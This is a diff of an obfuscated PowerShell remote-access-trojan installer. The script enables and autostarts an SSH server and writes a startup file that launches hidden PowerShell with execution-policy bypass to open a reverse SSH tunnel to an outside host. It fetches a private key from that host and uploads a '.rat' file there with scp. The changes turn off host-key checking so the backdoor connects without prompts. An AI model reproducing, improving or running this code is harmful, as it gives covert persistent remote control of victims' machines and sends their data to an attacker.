@@ -51,13 +51,15 @@ New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -Propert
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
+New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh
+ssh-keyscan.exe -H $ecPlmJVLRo >> $env:USERPROFILE\.ssh\known_hosts
 
 # startup file
 # TODO:  registry startup
 $GlNweBEFmh = RpLGWiUsIy
 $NyZnoLKCIs = Get-Location
 Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
-Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i $env:temp\key`"" 
+Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i $env:temp\key`"" 
 
 # rat file
 $CRYnrkaDbe = "$env:UserName.rat"
@@ -73,7 +75,7 @@ Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type
 
 # get key and sent rat
 Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key" -OutFile "$env:temp\key"
-scp -P $ENyMAhIrsb -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
+scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
 
 # cleanup
 Set-Location C:\Users
